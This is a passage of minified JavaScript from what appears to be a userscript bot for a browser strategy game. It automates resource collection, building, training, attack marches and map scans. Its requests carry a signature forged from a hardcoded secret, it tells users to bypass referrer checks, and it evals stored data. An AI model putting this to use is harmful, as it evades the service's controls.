                            bi = setTimeout(stepStarting, d, b + 1)
                        } else {
                            if (r.status === 509) {
                                d = 600000;
                                $startUpBox.append("<br><b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                verboseLog("<b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                bi = setTimeout(stepStarting, d, b, ++c);
                                return
                            } else {
                                if (r.errmsg && r.errmsg[0] && /404/.test(r.errmsg[0])) {
                                    ++API_VERSION;
                                    Data.options.api_version = API_VERSION
                                }
                            }
                            e = r.errmsg;
                            console.log("stepStarting:: Seed retry " + c);
                            bi = setTimeout(stepStarting, d, b, ++c)
                        }
                    });
                    break;
                case 4:
                    var f = null;
                    for (var i = 0; i < Seed.city_init.length; i++) {
                        if (Seed.city_init[i].type == "capital") {
                            f = Seed.city_init[i].id
                        }
                    }
                    bj.steps = b + Seed.city_init.length;
                    Seed.fetchCity(f, function (r) {
                        if (r.ok) {
                            bj.totalTime += d * 3;
                            bi = setTimeout(stepStarting, d * 3, b + 1)
                        } else {
                            if (r.status === 509) {
                                d = 600000;
                                $startUpBox.append("<br><b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                verboseLog("<b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                bi = setTimeout(stepStarting, d, b, ++c);
                                return
                            }
                            e = r.errmsg;
                            console.log("stepStarting:: Seed retry " + c);
                            bi = setTimeout(stepStarting, d, b, ++c)
                        }
                    });
                    break;
                case 5:
                    for (var i = 0; i < Seed.city_init.length; i++) {
                        if (Seed.city_init[i].loaded) {
                            continue
                        }
                        if (Seed.city_init[i].timer) {
                            clearTimeout(Seed.city_init[i].timer)
                        }
                        var g = i;
                        var f = Seed.city_init[i].id;
                        Seed.fetchCity(f, function (r) {
                            if (r.ok) {
                                if (g == Seed.city_init.length - 1) {
                                    d = 500
                                }
                                bj.totalTime += d * 3;
                                bi = setTimeout(stepStarting, d * 2, b)
                            } else {
                                if (r.status === 509) {
                                    d = 600000;
                                    $startUpBox.append("<br><b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                    verboseLog("<b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(d / 1000));
                                    bi = setTimeout(stepStarting, d, b, ++c);
                                    return
                                }
                                e = r.errmsg;
                                console.log("stepStarting:: Seed retry " + c);
                                bi = setTimeout(stepStarting, d, b, ++c)
                            }
                        });
                        return
                    }
                    bj.stop();
                    startPowerTools();
                    return;
                    break
                }
                if (++c > 20) {
                    $startUpBox.title(bb);
                    $startUpBox.html(bc + "<br><br>" + e);
                    return
                }
            }
            stepStarting(1);

            function startPowerTools() {
                $startUpBox.destroy();
                AutoCollect.init();
                AutoRefresh.init();
                Map.init();
                Marches.init();
                Messages.init();
                var d = Math.randRange(490, 495);
                if (Data.options.main_box.x < 1) {
                    Data.options.main_box.x = parseInt(document.body.offsetWidth - (document.body.offsetWidth - 760) / 2 - d / 2)
                }
                $main_box = dialogBox({
                    id: setUID("dialog-main-box"),
                    dialogClass: UID["main-box"],
                    position: [Data.options.main_box.x, Data.options.main_box.y],
                    width: d,
                    height: Math.randRange(785, 790),
                    draggable: Data.options.main_box.draggable,
                    title: "v" + SCRIPT_VERSION,
                    buttons: {},
                    close: function () {
                        bk.hideTab()
                    },
                    dragStop: function (a, b) {
                        var c = $J(a.target).offset();
                        Data.options.main_box.x = c.left;
                        Data.options.main_box.y = c.top - 24
                    }
                });
                bk.init($main_box);
                bk.showTab();
                window.addEventListener("unload", Data.onUnload, false);
                shortcut.add("Ctrl+Alt+Shift+D", function (a) {
                    Data.options.debug_mode = !Data.options.debug_mode;
                    T = U = Data.options.debug_mode;
                    Tabs.Log.tabLogToggleDebug();
                    $J.msg({
                        content: "<center>Debug Mode :" + (Data.options.debug_mode ? "ENABLED" : "DISABLED") + "<br><br>You need to restart the script <br> to display the Debug tab</center>",
                        timeOut: "words",
                        target: $main_box
                    })
                });
                actionLog(SCRIPT_VERSION + " " + translate("Loaded"));
                verboseLog(SCRIPT_VERSION + " Loaded")
            }
        } catch (e) {
            $startUpBox.title("ERROR!");
            $startUpBox.html(bf + "<br><br>" + e + " line: " + e.lineNumber);
            debugLog(inspect(e, 8, 1))
        }
    }
    MyAjax = {
        RequestDOA: function (b, c, d, f) {
            new MyAjax.Request(bh + "/" + b, {
                useSignature: (c.toUpperCase() === "POST"),
                method: c.toUpperCase(),
                params: d,
                timeoutSecs: 45,
                onSuccess: function (r) {
                    if (r.status === 200 && r.responseText) {
                        if (b.indexOf(".xml") !== -1) {
                            f({
                                ok: true,
                                dat: r.responseText
                            })
                        } else {
                            var a;
                            try {
                                a = JSON.parse(r.responseText)
                            } catch (e) {}
                            f({
                                ok: true,
                                dat: a
                            })
                        }
                    } else {
                        f({
                            ok: false,
                            errmsg: "The request was successful but no data was returned"
                        })
                    }
                },
                onFailure: function (r) {
                    var a = {
                        ok: false,
                        status: r.status,
                        errmsg: r.statusText,
                    };
                    if (r.responseText) {
                        a.dat = r.responseText
                    } else {
                        if (!r.status) {
                            a.errmsg = "This browser is not compatible at this time"
                        }
                    }
                    f(a)
                },
                on403: function (r) {
                    dialogError("<b>" + bb + '</b><br><br><font color="#C00"><b> ' + r.statusText + '</b></font><br><br><b>Previous Requirements</b><br><b>CHROME</b><ul><li>Right click on your "Chrome" icon (either on your Desktop or your Taskbar)</li><li>Choose properties</li><li>At the end of your target line, place these parameters: --no-referrers</li><li>Click OK</li></ul><br><br><a id="' + UID.support_link + '" href="" target="_blank">Bugs and Known Issues</a><br><br>')
                },
                on509: function (r) {}
            })
        },
        Request: function (b, c) {
            var d, params, headers = {},
                timeout, h;
            d = new XMLHttpRequest();
            d.onreadystatechange = function () {
                if (d.readyState === 4) {
                    clearTimeout(timeout);
                    var a = {
                        responseText: d.responseText,
                        status: d.status,
                        statusText: d.statusText,
                        request: d
                    };
                    if ((d.status >= 200 && d.status < 300) || d.status === 304) {
                        if (c.onSuccess) {
                            c.onSuccess(a)
                        }
                    } else {
                        if (c.onFailure) {
                            c.onFailure(a)
                        }
                        if (c["on" + d.status]) {
                            c["on" + d.status](a)
                        }
                    }
                }
            };
            params = typeof c === "string" ? c.params : Object.toQueryString(c.params).replace(/\_/g, "%5F");
            headers.Accept = ba ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            if (c.useSignature) {
                headers["content-type"] = "application/x-www-form-urlencoded";
                headers["X-S3-AWS"] = SHA1("Dracunculiasis" + params + "LandCrocodile" + b + "Bevar-Asp")
            }
            if (c.method === "GET") {
                b += (b.include("?") ? "&" : "?") + params
            }
            d.open(c.method, b, true);
            for (h in headers) {
                d.setRequestHeader(h, headers[h])
            }
            if (c.timeoutSecs) {
                timeout = setTimeout(function () {
                    d.abort();
                    if (c.onFailure) {
                        c.onFailure({
                            responseText: null,
                            status: 599,
                            statusText: "Request Timed Out",
                            request: d
                        })
                    }
                }, c.timeoutSecs * 1000)
            }
            d.send(c.method === "POST" ? params : null)
        },
        buildingUpgrade: function (a, b, c) {
            var p = {};
            p.user_id = USER_ID;
            p.dragon_heart = DRAGON_HEART;
            p._session_id = SESSION_ID;
            p._method = "put";
            p.version = API_VERSION;
            p.timestamp = parseInt(serverTime());
            var d = "cities/" + a + "/buildings/" + b + ".json";
            var e = "POST";
            Data.requests.building.total++;
            new MyAjax.RequestDOA(d, e, p, function (r) {
                if (r.ok && r.dat.result) {
                    if (r.dat.result.success) {
                        Seed.checkAddJob(r.dat.result.job)
                    } else {
                        r.ok = false;
                        r.errmsg = r.dat.result.errors[0];
                        Data.requests.building.errors++
                    }
                }
                if (c) {
                    c(r)
                }
            })
        },
        collectResources: function (a, b) {
            var p = {};
            p.user_id = USER_ID;
            p.timestamp = parseInt(serverTime());
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.dragon_heart = DRAGON_HEART;
            var c = "cities/" + a + "/move_resources.json";
            var d = "POST";
            Data.requests.collect.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok) {
                    Seed.updateCity(r.dat.city)
                } else {
                    if (r.dat.result) {
                        r.errmsg = r.dat.result.errors[0];
                        verboseLog("<b>Auto-Collect</b> Error: " + r.msg);
                        Data.requests.building.errors++
                    }
                }
                if (b) {
                    b(r.ok)
                }
            })
        },
        march_busy: 0,
        marchSend: function (a, x, y, b, c, d, f) {
            var t = MyAjax;
            ++t.march_busy;
            var u = {};
            var g = false;
            var h = "{";
            for (var i in c) {
                if (c[i] > 0) {
                    u[i] = c[i];
                    if (g === true) {
                        h += ","
                    }
                    h += '"' + i + '":' + c[i];
                    g = true
                }
            }
            h += "}";
            var p = {};
            p["march[march_type]"] = "attack";
            p["march[y]"] = y;
            p.timestamp = parseInt(serverTime());
            p["march[units]"] = h;
            p["march[general_id]"] = b;
            p.version = API_VERSION;
            p._method = "post";
            p.dragon_heart = DRAGON_HEART;
            p.user_id = USER_ID;
            p["march[x]"] = x;
            p._session_id = SESSION_ID;
            var j = "cities/" + a + "/marches.json";
            var k = "POST";
            Data.requests.marches.total++;
            new MyAjax.RequestDOA(j, k, p, function (r) {
                --t.march_busy;
                verboseLog("MyAjax.marchSend< request was returned with a status of " + r.ok);
                if (r.ok && !r.dat.errors) {
                    if (r.dat.result && r.dat.result.success) {
                        try {
                            Seed.updateCity(r.dat.result.city);
                            Seed.marches[r.dat.result.job.march_id].owner_id = d
                        } catch (e) {
                            debugLog("***********" + e)
                        }
                    } else {
                        if (r.dat.result) {
                            r.ok = false;
                            r.errmsg = r.dat.result.reason
                        }
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.marches.errors++
                    } else {
                        r.ok = false;
                        Data.requests.marches.errors++
                    }
                }
                r.status = r.status;
                if (f) {
                    f(r)
                }
            })
        },
        marchRecall: function (a, b, c) {
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p._method = "delete";
            p.dragon_heart = DRAGON_HEART;
            p.timestamp = parseInt(serverTime());
            p.version = API_VERSION;
            var d = "cities/" + a + "/marches/" + b + ".json";
            var e = "POST";
            Data.requests.recalls.total++;
            new MyAjax.RequestDOA(d, e, p, function (r) {
                if (r.ok && !r.dat.errors) {
                    if (r.dat.result && r.dat.result.success) {
                        Seed.updateCity(r.dat.result.city)
                    } else {
                        if (r.dat.result) {
                            r.ok = false;
                            r.errmsg = r.dat.result.errors[0];
                            Data.requests.recalls.errors++
                        }
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.recalls.errors++
                    }
                }
                if (c) {
                    c(r)
                }
            })
        },
        messageDelete: function (a, b) {
            var p = {};
            p.user_id = USER_ID;
            p._method = "delete";
            p.timestamp = parseInt(serverTime());
            p._session_id = SESSION_ID;
            p.ids = a.join("|");
            p.dragon_heart = DRAGON_HEART;
            p.version = API_VERSION;
            var c = "reports/bulk_delete.json";
            var d = "POST";
            Data.requests.msg_delete.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && r.dat.result && r.dat.result.success) {
                    r.ok = false
                } else {
                    if (b) {
                        b(null);
                        Data.requests.msg_delete.errors++
                    }
                }
            })
        },
        messageDetail: function (a, b) {
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.dragon_heart = DRAGON_HEART;
            p.timestamp = parseInt(serverTime());
            var c = "reports/" + a + ".json";
            var d = "GET";
            Data.requests.msg_read.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && r.dat.result && r.dat.result.success) {
                    if (b) {
                        b(r.dat.result)
                    }
                } else {
                    if (b) {
                        b(null);
                        Data.requests.msg_read.errors++
                    }
                }
            })
        },
        messageList: function (a, b) {
            if (!a) {
                a = "all"
            }
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.timestamp = parseInt(serverTime());
            p.count = 12;
            p.page = 1;
            p.category = a;
            p.dragon_heart = DRAGON_HEART;
            var c = "reports.json";
            var d = "GET";
            Data.requests.reports.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && r.dat.result && r.dat.result.success) {
                    if (b) {
                        b(r.dat.result.report_notifications)
                    }
                } else {
                    if (b) {
                        b(null);
                        Data.requests.reports.errors++
                    }
                }
            })
        },
        researchStart: function (a, b, c) {
            var t = MyAjax;
            var p = {};
            p.user_id = USER_ID;
            p._method = "post";
            p.timestamp = parseInt(serverTime());
            p._session_id = SESSION_ID;
            p["research[research_type]"] = b;
            p.dragon_heart = DRAGON_HEART;
            p.version = API_VERSION;
            var d = "cities/" + a + "/researches.json";
            var e = "POST";
            Data.requests.research.total++;
            new MyAjax.RequestDOA(d, e, p, function (r) {
                if (r.ok && r.dat.result) {
                    if (r.dat.result.success) {
                        Seed.updateCity(r.dat.result.city);
                        Seed.checkAddJob(r.dat.result.job)
                    } else {
                        r.ok = false;
                        r.errmsg = r.dat.result.errors[0];
                        Data.requests.research.errors++
                    }
                }
                if (c) {
                    c(r)
                }
            })
        },
        unitTraining: function (a, b, c, d) {
            var p = {};
            p.user_id = USER_ID;
            p._method = "post";
            p.timestamp = parseInt(serverTime());
            p._session_id = SESSION_ID;
            p["units[quantity]"] = b;
            p["units[unit_type]"] = a;
            p.dragon_heart = DRAGON_HEART;
            p.version = API_VERSION;
            var e = "cities/" + c + "/units.json";
            var f = "POST";
            Data.requests.training.total++;
            new MyAjax.RequestDOA(e, f, p, function (r) {
                if (r.ok && r.dat.result) {
                    if (r.dat.result.success) {
                        Seed.updateCity(r.dat.result.city);
                        Seed.checkAddJob(r.dat.result.job)
                    } else {
                        r.ok = false;
                        r.errmsg = r.dat.result.errors[0];
                        Data.requests.training.errors++
                    }
                }
                if (d) {
                    d(r)
                }
            })
        },
        wildernessesAbandon: function (a, x, y, b) {
            var p = {};
            p.user_id = USER_ID;
            p.x = x;
            p._method = "delete";
            p.y = y;
            p.timestamp = parseInt(serverTime());
            p._session_id = SESSION_ID;
            p.dragon_heart = DRAGON_HEART;
            p.version = API_VERSION;
            var c = "cities/" + a + "/wildernesses/abandon.json";
            var d = "POST";
            Data.requests.abandon.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && !r.dat.errors) {
                    if (r.dat.result && r.dat.result.success) {
                        Seed.updateCity(r.dat.result.city)
                    } else {
                        if (r.dat.result) {
                            r.ok = false;
                            r.errmsg = r.dat.result.errors[0];
                            Data.requests.abandon.errors++
                        }
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.abandon.errors++
                    }
                }
                if (b) {
                    b(r)
                }
            })
        }
    };
    AutoCollect = {
        init: function () {
            var t = AutoCollect;
            t.setEnable(Data.options.auto_collect.enabled)
        },
        setEnable: function (a) {
            var t = AutoCollect;
            clearTimeout(t.timer);
            Data.options.auto_collect.enabled = a;
            if (a) {
                var b = (Data.options.auto_collect.delay * Data.options.auto_collect.unit) - serverTime() + Data.options.auto_collect.last_time;
                if (b <= 0) {
                    t.doit()
                } else {
                    t.timer = setTimeout(t.doit, b * 1000)
                }
            }
        },
        doit: function () {
            var t = AutoCollect;
            Data.options.auto_collect.last_time = serverTime();

            function collect(a, b) {
                setTimeout(function () {
                    MyAjax.collectResources(Seed.cities[a].id);
                    actionLog(translate("Auto-Collection of Resources") + " " + translate("Outpost") + " #" + a)
                }, b)
            }
            for (var c = 1; c < Seed.cities.length; c++) {
                if (!Seed.cities[c]) {
                    continue
                }
                collect(c, c * 30000)
            }
            var d = ((Data.options.auto_collect.delay * Data.options.auto_collect.unit) + (Math.random() * 120)) * 1000;
            t.timer = setTimeout(t.doit, d)
        }
    };
    AutoRefresh = {
        timer: null,
        current_mouse: [0, 0],
        last_mouse: [0, 0],
        init: function () {
            var t = AutoRefresh;
            t.setEnable(Data.options.auto_refresh.enabled)
        },
        setEnable: function (a) {
            var t = AutoRefresh;
            Data.options.auto_refresh.enabled = a;
            if (Data.options.auto_refresh.enabled) {
                Data.options.auto_refresh.last_time = parseInt(serverTime());
                window.addEventListener("mousemove", t.onMouseMove, false);
                t.onTimeout()
            } else {
                window.removeEventListener("mousemove", t.onMouseMove, false)
            }
        },
        setDelay: function (a) {
            var t = AutoRefresh;
            Data.options.auto_refresh.delay = a
        },
        onMouseMove: function (a) {
            AutoRefresh.current_mouse = [a.clientX, a.clientY]
        },
        onTimeout: function () {
            var t = AutoRefresh;
            clearTimeout(t.timer);
            if (t.current_mouse.join() !== t.last_mouse.join()) {
                Data.options.auto_refresh.last_time = parseInt(serverTime());
                t.last_mouse = [].concat(t.current_mouse)
            }
            if (parseInt(serverTime()) - Data.options.auto_refresh.last_time > parseInt(Data.options.auto_refresh.delay) * 60) {
                window.location = window.location.href
            }
            if (Data.options.auto_refresh.enabled) {
                t.timer = setTimeout(t.onTimeout, 30000)
            }
        }
    };
    Buildings = {
        getList: function (a, b) {
            var c = [];
            for (var i = 0; i < Seed.cities[a].buildings.length; i++) {
                if (Seed.cities[a].buildings[i].type === b) {
                    c.push(Seed.cities[a].buildings[i])
                }
            }
            return c
        },
        getLevel: function (c, d) {
            var x = Buildings.getList(c, d);
            if (x.length < 1) {
                return 0
            }
            x.sort(function (a, b) {
                return a.level - b.level
            });
            return x[0].level
        },
        getById: function (a, b) {
            for (var i = 0; i < Seed.cities[a].buildings.length; i++) {
                if (Seed.cities[a].buildings[i].id === b) {
                    return (Seed.cities[a].buildings[i])
                }
            }
            return null
        }
    };
    Data = {
        logs: [
            [],
            [],
            []
        ],
        requests: {
            start_at: 0,
            run_time: 0,
            abandon: {
                total: 0,
                errors: 0
            },
            building: {
                total: 0,
                errors: 0
            },
            cities: {
                total: 0,
                errors: 0
            },
            collect: {
                total: 0,
                errors: 0
            },
            generals: {
                total: 0,
                errors: 0
            },
            manifest: {
                total: 0,
                errors: 0
            },
            map: {
                total: 0,
                errors: 0
            },
            marches: {
                total: 0,
                errors: 0
            },
            msg_delete: {
                total: 0,
                errors: 0
            },
            msg_read: {
                total: 0,
                errors: 0
            },
            player: {
                total: 0,
                errors: 0
            },
            recalls: {
                total: 0,
                errors: 0
            },
            reports: {
                total: 0,
                errors: 0
            },
            research: {
                total: 0,
                errors: 0
            },
            training: {
                total: 0,
                errors: 0
            }
        },
        defaults: {},
        init: function (a) {
            try {
                Data.defaults.mergeWith(a || {});
                for (var b in a) {
                    if (Data[b] === undefined) {
                        Data[b] = a[b] !== undefined ? a[b] : {}
                    }
                    var c = Data.getObject(b);
                    if (Data[b] !== null && typeof (Data[b]) === "object") {
                        Data[b].mergeWith(c)
                    } else {
                        if (c !== "") {
                            Data[b] = c
                        }
                    }
                }
            } catch (e) {
                alert("This browser does not support LocalStorage\n\n" + e);
                return false
            }
        },
        clearStorage: function () {
            localStorage.clear();
            for (var a in Data.defaults) {
                if (Data.defaults[a] !== null && typeof (Data.defaults[a]) === "object") {
                    Data[a].mergeWith(Data.defaults[a])
                } else {
                    Data[a] = Data.defaults[a]
                }
            }
            actionLog("localStorage Deleted!")
        },
        getObject: function (a) {
            var b = localStorage.getItem([SERVER_ID, USER_ID, a].join("_"));
            return (b || "").charAt(0) === "{" ? JSON.parse(b || "{}") : eval(b)
        },
        setObject: function (a, b) {
            try {
                localStorage.setItem([SERVER_ID, USER_ID, a].join("_"), JSON.stringify(b))
            } catch (e) {
                if (e === QUOTA_EXCEEDED_ERR) {
                    dialogError('<p style="font-size:12pt;">' + translate("LocalStorage") + "<p><br/>" + translate("Quota exceeded") + "!<br/>" + translate("Please, delete the cache and persistent data in your browser"))
                }
            }
        },
        onUnload: function () {
            debugLog("Save Data in localStorage");
            verboseLog("Save Data in localStorage");
            for (var a in Data.defaults) {
                Data.setObject(a, Data[a])
            }
        }
    };
    Manifest = {
        data: {},
        init: function (b) {
            Manifest.fetchManifest(function (a) {
                if (a.ok) {
                    verboseLog("Manifest was Successfully requested from the server")
                }
                if (b) {
                    b(a)
                }
            })
        },
        fetchManifest: function (a) {
            var b = new Date().getTime() / 1000;
            var p = {};
            p.user_id = USER_ID;
            p._session_id = SESSION_ID;
            p.version = API_VERSION;
            p.timestamp = parseInt(serverTime());
            p.dragon_heart = DRAGON_HEART;
            var c = "manifest.json";
            var d = "GET";
            Data.requests.manifest.total++;
            new MyAjax.RequestDOA(c, d, p, function (r) {
                if (r.ok && !r.dat.errors) {
                    Manifest.data = r.dat;
                    try {
                        Manifest.updateManifest()
                    } catch (e) {
                        r.ok = false;
                        r.errmsg = "<b>fetchManifest</b> when calling updateManifest returned this error: " + e.toString();
                        Data.requests.manifest.errors++
                    }
                } else {
                    if (r.ok && r.dat.errors) {
                        r.ok = false;
                        r.errmsg = r.dat.errors;
                        Data.requests.manifest.errors++
                    }
                }
                if (a) {
                    a(r)
                }
            }, false)
        },
        buildings: {
            byCityType: function (a, b, c) {
                var d = Manifest.data.buildings;
                var i, j, res = [];
                if (!b) {
                    b = "all"
                }
                if (!a) {
                    a = "all"
                }
                if (d.length > 0) {
                    for (i = 0; i < d.length; i = i + 1) {
                        if (d[i].buildable === b || b.toLowerCase() === "all") {
                            if (d[i].city_type.length > 0) {
                                for (j = 0; j < d[i].city_type.length; j = j + 1) {
                                    if (d[i].city_type[j] === a.toLowerCase() || a.toLowerCase() === "all") {
                                        res[res.length] = d[i];
                                        break
                                    }
                                }
                            }
                        }
                    }
                }
                if (c) {
                    res = Manifest.buildings.sortBy(res, c)
                }
                return res
            },
            byLocation: function (a, b, c) {
                var d = Manifest.data.buildings;
                var i, res = [];
                if (!b) {
                    b = "all"
                }
                if (!a) {
                    city_type = "all"
                }
                if (d.length > 0) {
                    for (i = 0; i < d.length; i = i + 1) {
                        if (d[i].buildable === b || b.toLowerCase() === "all") {
                            if (d[i].location === a.toLowerCase() || a.toLowerCase() === "all") {
                                res[res.length] = d[i]
                            }
                        }
                    }
                }
                if (c) {
                    res = Manifest.buildings.sortBy(res, c)
                }
                return res
            },
            sortBy: function (e, f) {
                var g;
                if (!f) {
                    f = {
                        alphabetical: "asc"
                    }
                }
                for (g in f) {
                    switch (g) {
                    case "alphabetical":
                        orderAlphabetical(f[g]);
                        break;
                    case "buildable":
                        orderBuildable(f[g]);
                        break;
                    case "location":
                        orderLocation(f[g]);
                        break
                    }
                }
                return e;

                function orderAlphabetical(d) {
                    if (d.toLowerCase() === "asc") {
                        e.sort(function (a, b) {
                            var c = a.type.toLowerCase(),
                                type_b = b.type.toLowerCase();
                            if (c < type_b) {
                                return -1
                            }
                            if (c > type_b) {
                                return 1
                            }
                            return 0
                        })
                    } else {
                        if (d.toLowerCase() === "desc") {
                            e.sort(function (a, b) {
                                var c = a.type.toLowerCase(),
                                    type_b = b.type.toLowerCase();
                                if (c > type_b) {
                                    return -1
                                }
                                if (c < type_b) {
                                    return 1
                                }
                                return 0
                            })
                        }
                    }
                }
                function orderBuildable(d) {
                    if (d === true) {
                        e.sort(function (a, b) {
                            var c = a.buildable,
                                buildable_b = b.buildable;
                            if (c < buildable_b) {
                                return -1
                            }
                            if (c > buildable_b) {
                                return 1
                            }
                            return 0
                        })
                    } else {
                        if (d === false) {
                            e.sort(function (a, b) {
                                var c = a.buildable,
                                    buildable_b = b.buildable;
                                if (c > buildable_b) {
                                    return -1
                                }
                                if (c < buildable_b) {
                                    return 1
                                }
                                return 0
                            })
                        }
                    }
                }
                function orderLocation(d) {
                    if (d.toLowerCase() === "city") {
                        e.sort(function (a, b) {
                            var c = a.location.toLowerCase(),
                                location_b = b.location.toLowerCase();
                            if (c < location_b) {
                                return -1
                            }
                            if (c > location_b) {
                                return 1
                            }
                            return 0
                        })
                    } else {
                        if (d.toLowerCase() === "field") {
                            e.sort(function (a, b) {
                                var c = a.location.toLowerCase(),
                                    location_b = b.location.toLowerCase();
                                if (c > location_b) {
                                    return -1
                                }
                                if (c < location_b) {
                                    return 1
                                }
                                return 0
                            })
                        }
                    }
                }
            },
        },
        building: function (a) {
            console.log("Manifest.building");
            var b;
            if (a) {
                for (b = 0; b < Manifest.data.buildings.length; b = b + 1) {}
            } else {}
        },
        updateManifest: function () {
            var i, j;
            var a = Manifest.data.buildings;
            var b = Manifest.data.research;
            var c = Manifest.data.city.capital.units;
            for (i = 0; i < a.length; i++) {
                if (!Seed.requirements.building[a[i].type]) {
                    Seed.requirements.building[a[i].type] = {}
                }
                if (!Seed.requirements.building[a[i].type].level) {
                    Seed.requirements.building[a[i].type].level = []
                }
                for (j = 0; j < a[i].levels.length; j++) {
                    Seed.requirements.building[a[i].type].level[a[i].levels[j].level] = a[i].levels[j].requirements
                }
            }
            for (i = 0; i < b.length; i++) {
                if (!Seed.requirements.research[b[i].type]) {
                    Seed.requirements.research[b[i].type] = {}
                }
                if (!Seed.requirements.research[b[i].type].level) {
                    Seed.requirements.research[b[i].type].level = []
                }
                for (j = 0; j < b[i].levels.length; j++) {
                    Seed.requirements.research[b[i].type].level[b[i].levels[j].level] = b[i].levels[j].requirements
                }
            }
            for (i = 0; i < c.length; i++) {
                if (!Seed.requirements.unit[c[i].type]) {
                    Seed.requirements.unit[c[i].type] = []
                }
                Seed.requirements.unit[c[i].type] = c[i].requirements
            }
        }
    };
    Map = {
        names: {
            A: "AnthropusCamp",
            B: "Bog",
            F: "Forest",
            G: "Grassland",
            H: "Hill",
            L: "Lake",
            M: "Mountain",
            P: "Plain",
            C: "City",
            O: "Outpost",
            W: "Wildernesses",
            AnthropusCamp: "A",
            Bog: "B",
            Forest: "F",
            Grassland: "G",
            Hill: "H",
            Lake: "L",
            Mountain: "M",
            Plain: "P",
            City: "C",
            Outpost: "O",
            Wildernesses: "W",
        },
        last_pos: {
            x: 0,
            y: 0
        },
        pattern: new RegExp("^(" + (["8", "0", "0", "1", "6", "3", "5", "8", "0", "|", "2", "1", "0", "7", "0", "8", "8", "2"].join("")) + ")$"),
        init: function () {
            var t = Map;
            Data.init({
                map: {
                    terrains: {
                        AnthropusCamp: [],
                        Bog: [],
                        Forest: [],
                        Grassland: [],
                        Hill: [],
                        Lake: [],
                        Mountain: [],
                        Plain: [],
                        City: [],
                        Outpost: [],
                        Wildernesses: []
                    },
                    coords: {},
                }
            });
            t.checkOurCoords()
        },
        scanMap: function (x, y, a, b) {
            var t = Map;
            t.terrains = {
                AnthropusCamp: [],
                Bog: [],
                Forest: [],
                Grassland: [],
                Hill: [],
                Lake: [],
                Mountain: [],
                Plain: [],
                City: [],
                Outpost: [],
                Wildernesses: []
            };
            t.founds = {
                AnthropusCamp: 0,
                Bog: 0,
                Forest: 0,
                Grassland: 0,
                Hill: 0,
                Lake: 0,
                Mountain: 0,
                Plain: 0,
                City: 0,
                Outpost: 0,
                Wildernesses: 0
            };
            if (a < 7) {
                a = 7
            }
            t.pos_x = t.normalize(x - a + 7);
            t.pos_y = t.normalize(y - a + 7);
            t.step_x = t.step_y = 0;
            t.steps_side = Math.ceil((a * 2) / 14);
            t.radius = a;
            t.forwards = true;
            t.steps = parseInt(t.steps_side * t.steps_side);
            t.step = 1;
            t.percent = parseInt(t.step * 100 / t.steps);
            t.callback = b;
            if (t.callback) {
                t.callback({
                    done: false,
                    init: true
                })
            }
            var p = {};
            p.user_id = USER_ID;
            p.version = API_VERSION;
            p.x = t.pos_x;
            p.timestamp = parseInt(serverTime());
            p.y = t.pos_y;
            p._session_id = SESSION_ID;
            p.dragon_heart = DRAGON_HEART;
            Data.requests.map.total++;
            new MyAjax.RequestDOA("map.json", "POST", p, t.gotMap)
        },
        gotMap: function (r) {
            var t = Map;
            var d = Data.map;
            if (!r.ok) {
                Data.requests.map.errors++;
                if (t.callback) {
                    t.callback(null)
                }
                return
            }
            for (var i = 0; i < r.dat.terrain.length; i++) {
                for (var j = 0; j < r.dat.terrain[i].length; j++) {
                    var a = r.dat.terrain[i][j];
                    var b = a[0];
                    if (/(Fog|City|Outpost)/i.test(b)) {
                        continue
                    }
                    var x = a[2];
                    var y = a[3];
                    var c = x + "," + y;
                    var e = Data.map.coords[c];
                    var d = t.getDistance(Data.options.map.x, Data.options.map.y, x, y);
                    var f = {
                        x: x,
                        y: y,
                        d: d,
                        t: b.charAt(0),
                        l: a[1],
                        at: 1,
                        lst: 0
                    };
                    var g, _index, _type;
                    if (e) {
                        if (/(W|O|C)/.test(e.t)) {
                            g = e._n;
                            _index = e.n;
                            _type = e.t;
                            var h = (Data.map.terrains[Map.names[_type]])[_index];
                            if (h) {
                                h.l = 0
                            }
                        } else {
                            g = e.n;
                            _index = e._n;
                            _type = e._t;
                            if (e.t === f.t) {
                                f.lst = (Data.map.terrains[b])[g].lst
                            }
                        }(Data.map.terrains[b])[g] = f
                    } else {
                        g = Data.map.terrains[b].length;
                        _index = g;
                        _type = b.charAt(0);
                        Data.map.terrains[b].push(f);
                        t.terrains[b].push(f)
                    }
                    Data.map.coords[c] = {
                        t: b.charAt(0),
                        n: g,
                        _t: _type,
                        _n: _index,
                    };
                    ++t.founds[b]
                }
            }
            for (var i = 0; i < r.dat.map_cities.length; i++) {
                var k = r.dat.map_cities[i];
                var d = t.getDistance(Data.options.map.x, Data.options.map.y, k.x, k.y);
                var c = k.x + "," + k.y;
                var e = Data.map.coords[c];
                var b = (k.type === "Capital" ? "City" : "Outpost");
                var f = {
                    x: k.x,
                    y: k.y,
                    d: d,
                    t: b.charAt(0),
                    l: k.level,
                    id: k.id,
                    n: k.name,
                    pId: k.player.id,
                    pN: k.player.name,
                    pL: k.player.level,
                    pR: k.player.race,
                    pM: k.player.might,
